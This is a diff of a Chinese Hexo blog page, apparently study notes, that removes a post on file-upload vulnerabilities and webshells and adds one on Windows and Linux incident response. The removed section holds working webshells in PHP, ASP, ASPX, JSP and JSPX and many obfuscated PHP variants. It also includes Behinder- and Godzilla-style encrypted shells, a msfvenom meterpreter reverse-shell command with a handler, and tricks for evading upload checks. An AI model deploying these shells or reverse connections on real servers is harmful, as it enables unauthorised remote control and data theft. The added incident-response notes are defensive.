@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>文件上传漏洞 webshell - Hexo</title>
+    <title>应急相应 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -406,7 +406,7 @@ header .header__right .dropdown-menus .dropdown-menu {
 <article class="page">
 <div id="post-meta-m">
     <div class="post-meta" id="post-meta">
-  <h3>文件上传漏洞 webshell</h3>
+  <h3>应急相应</h3>
     
       <span class="post-meta-label">
         John Doe
@@ -415,8 +415,8 @@ header .header__right .dropdown-menus .dropdown-menu {
     
       <span class="post-meta-label">
         <span class="p-dot"></span>
-        <time datetime="2022-04-13 10:23" pubdate>
-          2022-04-13
+        <time datetime="2022-05-23 08:55" pubdate>
+          2022-05-23
         </time>
       </span>
     
@@ -424,7 +424,7 @@ header .header__right .dropdown-menus .dropdown-menu {
       
       <span class="post-meta">
         <span class="p-dot"></span>
-        共 884 字
+        共 475 字
       </span>
     
     
@@ -440,111 +440,9 @@ header .header__right .dropdown-menus .dropdown-menu {
   </div>
     <div id="article">
       <div id="post-content" class="markdown-body textretty">
-        <p>⽂件上传<br>原理：<br>补充<br>webshell分类<br>⼀句话⽊⻢：代码量⼩，需要和webshell管理⼯具配合使⽤；<br>php:<?php @eval($_POST[_]);?> <?php @assert($_POST[_]);?><br>asp：&lt;% eval request(“k”)%&gt;<br>aspx:<br>&lt;%@ Page Language=”Jscript”%&gt;<br>&lt;%eval(Request.Item[“cmd”],”unsafe”);%&gt;<br>jsp:<br>&lt;%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte<br>[]b){ return super.defineClass(b,0,b.length); }}%&gt;&lt;% String cls=request.getParameter(“ant”);if(cls!=null)<br>{ new U(this.getClass().getClassLoader()).g(new<br>sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%&gt;<br>jspx:</p>
-<hr>
-<p>&lt;jsp:root xmlns:jsp=”<a target="_blank" rel="noopener" href="http://java.sun.com/JSP/Page&quot;">http://java.sun.com/JSP/Page&quot;</a><br>version=”1.2”&gt;<br> <a href="jsp:declaration">jsp:declaration</a><br> class U extends ClassLoader {<br> U(ClassLoader c) {<br> super(c);<br> }<br> public Class g(byte[] b) {<br> return super.defineClass(b, 0, b.length);<br> }<br> }<br> public byte[] base64Decode(String str) throws Exception {<br> try {<br> Class clazz = Class.forName(“sun.misc.BASE64Decoder”);<br> return (byte[]) clazz.getMethod(“decodeBuffer”,<br>String.class).invoke(clazz.newInstance(), str);<br> } catch (Exception e) {<br> Class clazz = Class.forName(“java.util.Base64”);<br> Object decoder = clazz.getMethod(“getDecoder”).invoke(null);<br> return (byte[]) decoder.getClass().getMethod(“decode”,<br>String.class).invoke(decoder, str);<br> }<br> }<br> </jsp:declaration><br> <a href="jsp:scriptlet">jsp:scriptlet</a><br> String cls = request.getParameter(“ant”);<br> if (cls != null) {<br> new<br>U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br> }<br> </jsp:scriptlet><br></jsp:root></p>
-<hr>
-<p>⼩⻢：功能单⼀（⽂件上传、命令执⾏等），通常和⼤⻢结合使⽤；<br>⼤⻢：功能较多，代码量⼤，隐蔽性差，常⻅功能有⽂件管理、虚拟终端、数据库管理、提<br>权、信息收集等<br>内存⻢：扩展（php+.net+java+python等）<br><?php @eval($_POST["cmd"]);?><br><?php ?> <? ?><br>@屏蔽错误<br>eval() php函数，解析字符串类型的php代码（使⽤标准的PHP语法写的代码） $str=”phpinfo();”<br>$_POST[“cmd”] 以POST⽅式接受cmd的值<br>$_GET[“cmd”]<br>$_REQUEST[“cmd”] *****<br>website<br>源码所在的位置，document_root<br>/var/www/html<br>E:\phpStudy2018\PHPTutorial\WWW<br>webshell管理⼯具（三⼤功能：⽂件管理+虚拟终端+数据库管理）<br>中国菜⼑<br>中国蚁剑<br>冰蝎<br>哥斯拉<br>等等<br>将⽊⻢⽂件（webshell，必须根据服务器类型上传对应类型⽊⻢）上传到⽬标服务器，知道其位<br>置，然后去访问<br>IIS:ASP ASPX等<br>WAMP/LAMP/WNMP(windows+nginx+mysql+php)/lnmp: php<br>tomcat/jboss/weblogic:jsp<br>flask python:py<br><a target="_blank" rel="noopener" href="http://192.168.10.100:88/webshell.php">http://192.168.10.100:88/webshell.php</a><br>浏览器：<br>hackbar f12<br>foxproxy<br>web developer<br>phpinfo() 是PHP函数，PHP配置环境参数<br><?php @eval($_POST["k"]);?><br>POST：k=phpinfo();<br>$_POST[“k”]=”phpinfo();”<br><?php @eval("phpinfo();");？>
-k=system("net user");
-exec();
-shell_exec()
-``
-等等
-在webshell⾥权限取决于web站点的权限
-http://123.58.236.76:54312/hackable/uploads/shell.php
-链接数据库：ip:port 账号 密码
-web+DB
-web db 分开
-getshell:获取到站点权限；
-配置⽂件：conf.php conf.ini.php 等等
-<T>MYSQL</T> 数据库类型
-<H>localhost</H> ip:port
-<U>root</U> 账号
-<P></P> 密码
-<L>utf8</L> 编码
-antsowrd=loader+js源码
-JDK
-JDK8
-JDK14
-JDK17
-java -jar xxx.jar
-密码学
-密码编码学
-密码分类：
-古典密码
-近代密码
-现在密码
-对称：
-⾮对称：
-散列：
-序列密码:
-PKI
-等
-密码分析学
-webshell变形
-基础变形
-(1)str_replase 
-$a=str_replace("x","","axxxsxsxexrxt");
-$a($_POST["cmd"]);
-(2)拼接
-$_GET["k"]($_GET["v"])
-k=assert&v=phpinfo();
-http://192.168.10.100:88/index123.php?k=assert&v=@eval($_POST[k]);
-$_POST["k"]($_POST["v"])
-(3)preg_replace /e
-<?php preg_relace("/p/e",'$_POST["k"]',"pentest");?><br>(4)create_function()<br><?php
-$fun=create_function("",$_POST['a']);
-$fun();
-?><br>(5)call_user_func()<br><?php call_user_func(assert,$_POST['a']);?><br>(6)js型的PHP webshell</p>
-<script language=php>@eval($_POST['web']);</script>
-<p>⾼级变形<br>（1）php可变变量<br><?php $bb="eval"; $a="bb";$$a($_POST["A"]);?><br>（2）base64_decode /str_rot13<br><?php $a=base64_decode("YXNzZXJ0");$a($_POST["A"]);?><br>(3). 拼接<br>$a=”a”;<br>$b=$a.”sser”;<br>$c=$b.”t”;<br>$c($_POST[“A”]);<br>（4）数组拼接<br>$__C_C=”WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09”;<br>$__P_P=”abcdefghijklmnopqrstuvwxyz”;<br>$__X_X=”123456789”;<br>$__O_O=$__X_X[5].$_<em>X_X[3].”</em>“;//64_<br>$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];//base<br>$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].<br>$__P_P[4];//base64_decode<br>$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];//enco<br>$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];<br>$_<em>F_F.=’</em>‘.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].<br>$__P_P[14].$_<em>P_P[13];<br>$</em>[00]=$__F_F(‘$__S_S’,$__E_E.’(“$_<em>S_S”);’);<br>@$</em><a href="$__H_H($__H_H($__C_C))">00</a>;<br>(5){ }<br>$tk = array(“a”=&gt;”assert”);<br>$a = “${$tk<a href="$_POST%5Ba%5D">“a”</a>}”;<br>(6)反序列化<br><?php
- class Blog
- {
- var $vul = '';
- function __destruct() #析构函数
- {
- eval($this->vul);
- }
- }
- unserialize($_GET['name']);
-?><br><a target="_blank" rel="noopener" href="http://192.168.2.101/eee.php?name=O:4:&quot;Blog&quot;:1:%7Bs:3:&quot;vul&quot;;s:10:&quot;phpinfo();&quot;;%7D">http://192.168.2.101/eee.php?name=O:4:&quot;Blog&quot;:1:{s:3:&quot;vul&quot;;s:10:&quot;phpinfo();&quot;;}</a><br>(7)uasort php&gt;5.4 使⽤⽤户⾃定义的⽐较函数对素组中元素按照键值去排序，<br>$a=$_REQUEST[“k1”];<br>$b=array(‘test’,$_REQUEST[“k2”]);<br>uasort($b,$a);<br>$a 恶意函数 assert —-&gt;k1 =assert<br>$b php代码 —-&gt;k2=phpinfo();<br><a target="_blank" rel="noopener" href="http://192.168.10.100:88/index123.php?k1=assert&amp;k2=phpinfo()">http://192.168.10.100:88/index123.php?k1=assert&amp;k2=phpinfo()</a>;<br>（8）加密变形<br><?php
-if(isset($_POST['com'])&&md5($_POST['com'])== '202cb962ac59075b964b07152d234b70'&& 
-isset($_POST['content']))
-$content = strtr($_POST['content'], '-_,', '+/=');eval(base64_decode($content));
-?><br>（9）加密拼接<br><?php 
-$_uU=chr(99).chr(104).chr(114);
-$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).
-$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);
-$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).
-$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);
-$_=$_fF("",$_cC);@$_();
-?><br>（10）冰蝎和哥斯拉带的⽊⻢或者⽣成的⽊⻢<br><?php
-@error_reporting(0);
-session_start();
- $key="cbff36039c3d0212"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
-$_SESSION['k']=$key;
-$post=file_get_contents("php://input");//接受⽤户端发送来的数据
-if(!extension_loaded('openssl'))
-{
-$t="base64_"."decode";
-$post=$t($post."");
-for($i=0;$i<strlen($post);$i++) {
- $post[$i] = $post[$i]^$key[$i+1&15]; 
- }
-}
-else
-{
-$post=openssl_decrypt($post, "AES128", $key);//有扩展的情况
-}
- $arr=explode('|',$post);
- $func=$arr[0];//函数
- $params=$arr[1];//参数
-class C{public function __invoke($p) {eval($p."");}}
- @call_user_func(new C(),$params);//回调函数
-?><br>&lt;?php<br>@session_start();<br>@set_time_limit(0);<br>@error_reporting(0);<br>function encode($D,$K){<br> for($i=0;$i&lt;strlen($D);$i++) {<br> $c = $K[$i+1&amp;15];<br> $D[$i] = $D[$i]^$c;<br> }<br> return $D;<br>}<br>$pass=’pass’;<br>$payloadName=’payload’;<br>$key=’3c6e0b8a9c15224a’;<br>if (isset($_POST[$pass])){<br> $data=encode(base64_decode($_POST[$pass]),$key);<br> if (isset($_SESSION[$payloadName])){<br> $payload=encode($_SESSION[$payloadName],$key);<br> if (strpos($payload,”getBasicsInfo”)===false){<br> $payload=encode($payload,$key);<br> }<br>eval($payload);<br> echo substr(md5($pass.$key),0,16);<br> echo base64_encode(encode(@run($data),$key));<br> echo substr(md5($pass.$key),16);<br> }else{<br> if (strpos($data,”getBasicsInfo”)!==false){<br> $_SESSION[$payloadName]=encode($data,$key);<br> }<br> }<br>}<br>msf metasploit postgresql<br>/etc/init.d/postgresql start<br>/ststemctl start postgresql<br>msfvenom<br>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.10.103 LPORT=8899 -f raw </p>
-<blockquote>
-<p>shell.php<br>将该⽊⻢投放在⽬标服务器中。<br>-p payload类型 php/meterpreter/reverse_tcp<br>LHOST=192.168.179.100 LPORT=9999 会连的地址和IP<br>-f ⽂件类型<br>msfconsole<br>handler -p php/meterpreter/reverse_tcp -H 0.0.0.0 -P 8899<br>⽂件上传<br>拦截策略<br>⽆任何拦截：任意⽂件上传<br>有拦截策略：<br>前端：<br>js<br>后端：<br>检测MIME（centent-type）<br>检测内容/⽂件头（图⽚的魔术头）<br>图⽚渲染<br>⽩名单检测<br>⿊名单检测<br>第三⽅检测<br>js拦截<br>（1）关闭JS解析<br>（2）修⽂件上传，拦截数据包，修改再放⾏<br>检测MIME（centent-type）<br>Content-Type: image/jpeg<br>Content-Type: image/png<br>Content-Type: text/php<br>Content-Type: text/plain<br>上传php⽂件，拦截数据包，修改Content-Type为图⽚的Content-Type即可<br>php修改为png,拦截数据包，修改⽂件后缀为php</p>
-</blockquote>
+        <p>windows应急响应：1.进程分析：在任务管理中，或者火绒剑等安全软件中查看，cpu内存资源查看    systeminfo<br>2.启动项：任务管理器中启动键下<br>3.计划任务：控制面板-&gt;系统和安全-&gt;管理工具下有计划任务<br>4.网络排查：cmd中 netstat -noe 通过网络找进程，通过进程找文件打开任务管理器使用Ctrl+Alt+delete或者在windows下面状态栏右键选择任务管理器打开，通过点击详细信息，pid排序找到要找的pid来关闭恶意程序。<br>5.样本识别网站：<a target="_blank" rel="noopener" href="http://www.virscan.org/">www.virscan.org</a>     微步云沙箱  D盾（webshell查杀工具）<br>6.日志分析：<br>·系统日志：事件查看器：4624登陆成功 4625登陆失败 4634注销成功 4672超级管理员登录 4720创建用户     登录类型 2-交互登录  3-网络登录  10-远程登录</p>
+<p>·web日志：1.外部暴力脆弱网站 2.植入后门 3.提权 4.权限维持 5.控制主机，内网扫描<br>apache日志：access.log<br>7.系统账号：net user</p>
+<p>Linux应急响应：1.进程分析：ps -aux   lsof -p pid号    lsof -i @localhost:20,80 -r3  监听端口<br>2.端口：netstat -pantu  展示所有tcp,udp活跃的ip和端口号<br>3.后门排查：find 路径 -name “<em>.php”|xargs eprep ‘eval’<br>4.文件路径：ls -l /proc/pid号/exe 查询具体文件在什么位置<br>5.系统命令：history<br>6.工具查杀：河马   深信服-webshellkiller  openrasp<br>7.日志分析：系统日志  在/var/log/下  主要关注grep “useradd” /var/log/secure(找到增加用户的日志)  grep “userdel” /var/log/secure(找到删除用户的日志)   grep “Failed password for root” /var/log/secure(登录用户失败日志)<br>web日志<br>8.敏感文件：用户文件/etc/passwd  密码文件/etc/shadow 计划任务文件/etc/crontab  ls /etc/corn.</em><br>9.查看系统服务：chkconfig –list</p>
 
       </div>
     </div>
